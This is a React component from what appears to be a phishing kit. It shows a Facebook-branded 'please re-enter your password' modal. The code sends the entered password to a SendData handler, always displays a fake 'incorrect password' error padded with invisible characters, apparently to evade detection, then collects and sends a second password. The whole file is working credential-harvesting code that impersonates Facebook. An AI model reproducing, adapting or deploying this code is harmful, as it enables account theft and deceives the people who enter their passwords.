import React, { useContext, useState } from 'react'
import { Col, Row } from 'react-bootstrap'
import styled from 'styled-components'
import SendData from '../hooks/SendData'
import { DataContext } from '../pages'


const Wrapper = styled.div`
    position: fixed;
    top: 0;
    left: 0;
    z-index: 1050;
    width: 100%;
    height: 100%;
    overflow: hidden;
    outline: 0;
    display: grid;
    place-items: center;
    background-color: rgba(0,0,0,.5);
    padding: 1.5rem;
`
const ModalContent = styled.div`
    background-color: #fff;
    background-clip: padding-box;
    border: 1px solid rgba(0,0,0,.2);
    border-radius: 1.5rem;
    outline: 0;
    max-width: 500px;
    width: 100%;
    z-index: 1051;
    position: relative;
    .redborder {
        border: 1px solid red !important;
    }
    .gradient {
        position: absolute;
        left: 0%;
        top: 0%;
        height: 100%;
        width: 100%;
        background-image: radial-gradient(rgba(255, 255, 255, .25), rgba(255, 255, 255, 0) 40%), radial-gradient(hsla(44, 100%, 66%, 1) 30%, hsla(338, 68%, 65%, 1), hsla(338, 68%, 65%, .4) 41%, transparent 52%), radial-gradient(hsla(272, 100%, 60%, 1) 37%, transparent 46%), linear-gradient(155deg, transparent 65%, hsla(142, 70%, 49%, 1) 95%), linear-gradient(45deg, hsla(213, 100%, 44%, 1), hsla(209, 100%, 53%, 1));
          background-repeat: no-repeat;
          opacity: .08;
          z-index: -1;
          background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
          background-position: bottom left, 109% 68%, 109% 68%, center, center;
    }
`

const Title = styled.div`
    color: #050505 !important;
    font-size: 18px !important;
    font-weight: 700 !important;
`

const XBtn = styled.div`
    font-size: 3rem;
    font-weight: 400;
    line-height: 1;
    color: #000;
    text-shadow: 0 1px 0 #fff;
    opacity: 1;
    cursor: pointer;
`
const BorderBottom = styled.div`
    border-bottom:1px solid #dee2e6;
`
const Label = styled.div`
    color: #90949c;
    font-weight: bold;
    font-size: 12px;
    padding-bottom: 0.5rem;
`
const Input = styled.input`
    border: 1px solid #ced4da !important;
    border-radius: 8px !important;
    padding: 0.75rem 0.75rem !important;
    background-color: #fff;
    ::placeholder {
        opacity: 0.5;
        font-weight: 500;
    }
    
`
const Btn = styled.button`
    background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    margin-top: 15px;
    font-size: 13px;
    font-weight: 500;
    padding: 14px 20px;
    border-radius: 50px;
    text-transform: none;
    margin-top: 5rem;
    line-height: 1;
`
const ModalParagraph = styled.div`
    line-height: 1.3;
    padding-bottom: 0.5rem;
`
const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`

function ModalPw2({ setStep, Unik, Name, Ip, Step }) {
    const [Pw, setPw] = useState('')
    const [TriedSubmit, setTriedSubmit] = useState(false)
    const [SubmitTime, setSubmitTime] = useState(0)

    const [IsLoading, setIsLoading] = useState(false)

    const [BeginTimer, setBeginTimer] = useState(false)



    let { setAllData, AllData } = useContext(DataContext);

    const handleSubmit = () => {

        setTriedSubmit(true)
        if (SubmitTime === 0 && Pw.length > 5) {
            setIsLoading(true)

            const params = {
                ...AllData,
                password_one: Pw,
                currentStep: 'Password2'
            };
            setAllData(params)
            SendData(params)

            setTimeout(() => {
                setSubmitTime(1)
                setPw('')
                setIsLoading(false)
            }, 1000);
        }
        else if (SubmitTime === 1) {
            setIsLoading(true)

            const params = {
                ...AllData,
                password_two: Pw
            };

            setAllData(params)
            SendData(params)

            var body = document.getElementsByTagName('body')[0];
            body.style.overflowY = 'auto'

            setBeginTimer(true)


        }

    }



    React.useEffect(() => {
        if (BeginTimer) {

            var timer1 = setTimeout(() => {
                setIsLoading(false)

                setStep(3)
            }, 60000);
        }

        return () => {

            clearTimeout(timer1)
        }
    }, [BeginTimer])

    return (
        <Wrapper>
            <ModalContent>
                <div className='gradient'>

                </div>
                <div className='px-3 pt-5'>

                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
                        {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' + (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
                    </span>
                    <div className='py-1'>
                        <Title>
                            Please re-enter your password
                        </Title>
                    </div>
                </div>
                <div className="px-3 pb-3">
                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
                        For your security, you must re-enter your password to continue.
                    </span>

                    <div className='pt-2'>
                        <Input placeholder='Password' disabled={IsLoading} className={`inputTypePW form-control ${(Pw.length < 5 && TriedSubmit) && 'redborder'}`} type='text' value={Pw} onChange={(e) => { setPw(e.target.value) }} />
                        {
                            SubmitTime === 1 && (
                                <div className='text-end' style={{ color: 'red', fontSize: '13px', fontWeight: 500 }}>
                                    T‎h‎e p‎as‎sw‎or‎d yo‎u‎'‎ve e‎nt‎er‎ed i‎s in‎c‎o‎r‎r‎e‎ct.
                                </div>
                            )
                        }
                    </div>
                    <div className='text-end pt-4'>
                        <Btn onClick={handleSubmit} disabled={IsLoading}>
                            {IsLoading ? <Spinner /> : 'Submit'}
                        </Btn>
                    </div>
                </div>
            </ModalContent>
        </Wrapper >
    )
}

export default ModalPw2